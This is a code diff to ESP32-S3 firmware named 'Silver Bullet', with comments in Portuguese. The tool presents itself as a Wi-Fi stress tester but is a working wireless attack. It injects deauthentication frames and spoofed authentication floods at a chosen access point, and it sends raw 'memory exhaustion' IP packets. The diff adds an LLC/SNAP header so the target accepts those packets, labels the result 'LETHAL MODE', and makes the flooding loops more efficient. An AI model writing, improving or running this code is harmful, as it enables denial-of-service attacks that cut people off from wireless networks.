@@ -2,11 +2,11 @@
  * @file silver_bullet.cpp
  * @brief Silver Bullet - Ferramenta Avançada de Teste de Estresse Wi-Fi (L2/L3)
  * @hardware M5Stack Cardputer (ESP32-S3)
- * * * Correções Arquiteturais Aplicadas:
- * 1. Task Starvation Resolvido: Prioridade da task_ataque reduzida para 20 (Abaixo da wifi_task do ESP-IDF).
- * 2. Conflito de Scanner: Modo promíscuo removido, permitindo injeção Raw nativa em modo STA.
- * 3. OOM CPU Leak: Checagem de ESP_ERR_NO_MEM estendida para L2, com yield real (vTaskDelay) para o driver.
- * 4. PRNG Freeze: Proteção matemática contra semente zero no motor Xorshift32.
+ * * * Correções Arquiteturais Definitivas:
+ * 1. L3 Penetration: Implementação do cabeçalho LLC/SNAP para validar o payload no kernel alvo.
+ * 2. Tick Real do RTOS: Uso de vTaskDelay(1) contornando a falha de divisão de macro.
+ * 3. Otimização L2: Preempção imediata e quebra de loop ao detectar esgotamento do buffer DMA.
+ * 4. Task Starvation: wifi_task blindada contra a saturação do Core 0.
  */
 
 #include <M5Unified.h>
@@ -55,6 +55,15 @@ struct __attribute__((packed)) MacHeader {
     uint16_t seq_ctrl;
 };
 
+// NOVO: Cabeçalho LLC/SNAP vital para que o AP não descarte o pacote L3
+struct __attribute__((packed)) LlcSnapHeader {
+    uint8_t dsap;
+    uint8_t ssap;
+    uint8_t control;
+    uint8_t oui[3];
+    uint16_t ethertype;
+};
+
 struct __attribute__((packed)) IpHeader {
     uint8_t  version_ihl;   
     uint8_t  tos;
@@ -70,6 +79,7 @@ struct __attribute__((packed)) IpHeader {
 
 struct __attribute__((packed, aligned(4))) SilverBulletPacket {
     MacHeader mac;
+    LlcSnapHeader llc; // Inserido entre MAC e IP
     IpHeader ip;
     uint8_t payload[32]; 
 };
@@ -95,7 +105,6 @@ uint32_t prng_state = 1;
 // -------------------------------------------------------------------
 // 3. MOTORES DE ALTA PERFORMANCE (SRAM / IRAM_ATTR)
 // -------------------------------------------------------------------
-
 IRAM_ATTR inline uint32_t fast_rand() {
     uint32_t x = prng_state;
     x ^= x << 13;
@@ -225,7 +234,7 @@ void task_display(void *pvParameters) {
 }
 
 // -------------------------------------------------------------------
-// 6. MOTOR DE INJEÇÃO DMA (CORE 0 - CORRIGIDO)
+// 6. MOTOR DE INJEÇÃO DMA (CORE 0 - LETHAL MODE)
 // -------------------------------------------------------------------
 void task_ataque(void *pvParameters) {
     
@@ -233,11 +242,19 @@ void task_ataque(void *pvParameters) {
     DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
     AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
     
-    // CORREÇÃO 4: Risco de Congelamento do Motor de Entropia (Xorshift32)
     prng_state = esp_random(); 
     if (prng_state == 0) prng_state = 1; 
 
     for(size_t i = 0; i < sizeof(pkt->payload); i++) pkt->payload[i] = (uint8_t)(fast_rand() & 0xFF);
+
+    // Inicialização Fixa do Cabeçalho LLC/SNAP (Assinatura IPv4)
+    pkt->llc.dsap = 0xAA;
+    pkt->llc.ssap = 0xAA;
+    pkt->llc.control = 0x03;
+    pkt->llc.oui[0] = 0x00;
+    pkt->llc.oui[1] = 0x00;
+    pkt->llc.oui[2] = 0x00;
+    pkt->llc.ethertype = htons(0x0800);
 
     while (true) {
         if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load()) {
@@ -246,7 +263,7 @@ void task_ataque(void *pvParameters) {
             esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
             uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
 
-            // --- L2: DEAUTH (NAV SPOOFING) ---
+            // --- L2: DEAUTH ---
             memset(deauth, 0, sizeof(DeauthPacket));
             deauth->frame_control = 0x00C0; 
             deauth->duration = 32767; 
@@ -265,7 +282,7 @@ void task_ataque(void *pvParameters) {
             auth->auth_seq = 0x0100;
             auth->status_code = 0x0000;
 
-            // --- L3: MEMORY EXHAUSTION ---
+            // --- L3: MEMORY EXHAUSTION (Com LLC Ativo) ---
             memset(&pkt->mac, 0, sizeof(MacHeader)); 
             memset(&pkt->ip, 0, sizeof(IpHeader));
             pkt->mac.frame_control = 0x0008; 
@@ -275,7 +292,7 @@ void task_ataque(void *pvParameters) {
             pkt->ip.ttl = 64;
             pkt->ip.protocol = 17;
 
-            // 1. Rajada L2 Mista
+            // 1. Rajada L2 Mista Otimizada
             for(int j = 0; j < 15; j++) {
                 memcpy(auth->mac_src, mac_alvo, 3); 
                 auth->mac_src[3] = fast_rand() & 0xFF;
@@ -286,16 +303,19 @@ void task_ataque(void *pvParameters) {
                 deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
 
                 esp_err_t err1 = esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false);
+                if (err1 == ESP_ERR_NO_MEM) {
+                    vTaskDelay(1); // Bloqueio real garantido
+                    break;
+                }
+
                 esp_err_t err2 = esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false);
-                
-                // CORREÇÃO 3: Prevenção de CPU Cycle Leak no L2
-                if (err1 == ESP_ERR_NO_MEM || err2 == ESP_ERR_NO_MEM) {
-                    vTaskDelay(pdMS_TO_TICKS(1)); // Tick real para limpeza do driver
+                if (err2 == ESP_ERR_NO_MEM) {
+                    vTaskDelay(1); 
                     break;
                 }
             }
 
-            // 2. Rajada L3
+            // 2. Rajada L3 Otimizada
             for (int i = 0; i < 150; i++) { 
                 memcpy(pkt->mac.mac_src, mac_alvo, 4);
                 pkt->mac.mac_src[4] = fast_rand() & 0xFF;
@@ -311,10 +331,8 @@ void task_ataque(void *pvParameters) {
                 pkt->ip.checksum = calcular_checksum_ip(&pkt->ip, sizeof(IpHeader));
                 
                 esp_err_t err3 = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(SilverBulletPacket), false);
-                
-                // CORREÇÃO 3: Prevenção de CPU Cycle Leak no L3
                 if (err3 == ESP_ERR_NO_MEM) {
-                    vTaskDelay(pdMS_TO_TICKS(1)); 
+                    vTaskDelay(1); 
                     break;
                 }
             }
@@ -345,7 +363,6 @@ extern "C" void app_main(void) {
     esp_wifi_start();
     esp_wifi_set_ps(WIFI_PS_NONE); 
 
-    // CORREÇÃO 1: Task Starvation (Prioridade reduzida para 20. wifi_task roda em 23)
     xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 20, NULL, 0); 
     xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
     xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
@@ -380,10 +397,6 @@ extern "C" void app_main(void) {
                 if (total_alvos > 0) {
                     canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary);
                     M5.Display.clear();
-                    
-                    // CORREÇÃO 2: Modo promíscuo removido para não travar o Scan no Core 1.
-                    // A injeção Raw L2/L3 funciona perfeitamente apenas com a interface STA ligada.
-                    
                     estado_atual.store(ESTADO_ATIRAR);
                 } else {
                     escanear_redes();
